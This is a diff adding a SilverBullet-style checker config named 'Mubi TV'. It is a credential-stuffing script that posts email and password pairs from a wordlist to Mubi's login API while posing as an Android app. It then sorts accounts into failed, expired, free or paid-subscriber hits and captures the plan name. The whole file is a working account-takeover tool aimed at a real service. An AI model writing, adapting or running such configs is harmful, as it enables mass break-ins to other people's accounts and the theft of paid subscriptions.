@@ -1,0 +1,99 @@
+[SETTINGS]
+{
+  "Name": "Mubi TV",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-07T11:57:42.8395142+03:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "Astronot",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Mubi TV",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST POST "https://mubi.com/api/v1/sessions" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Client: android" 
+  HEADER "Client-Version: 5.26" 
+  HEADER "Client-Device-Identifier: fb734e0a-5a75-4e46-ace5-b6d0c9cc8518" 
+  HEADER "Client-App: mubi" 
+  HEADER "Client-Device-Brand: OnePlus" 
+  HEADER "Client-Device-Model: A5010" 
+  HEADER "Client-Device-OS: 7.1.2" 
+  HEADER "Host: mubi.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "User-Agent: okhttp/4.7.2" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid login credentials" 
+    KEY "That email and password combination is not valid" 
+  KEYCHAIN Success OR 
+    KEY "created_at" 
+    KEY "expires_at" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "message\":\"Unactivated user" 
+
+PARSE "<SOURCE>" LR "},\"name\":\"" "\",\"external" CreateEmpty=FALSE -> CAP "Plan" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "active_subscriber\":false" 
+    KEY "<SOURCE>" DoesNotContain "You currently have an active subscription" 
+  KEYCHAIN Success OR 
+    KEY "active_subscriber\":true" 
+
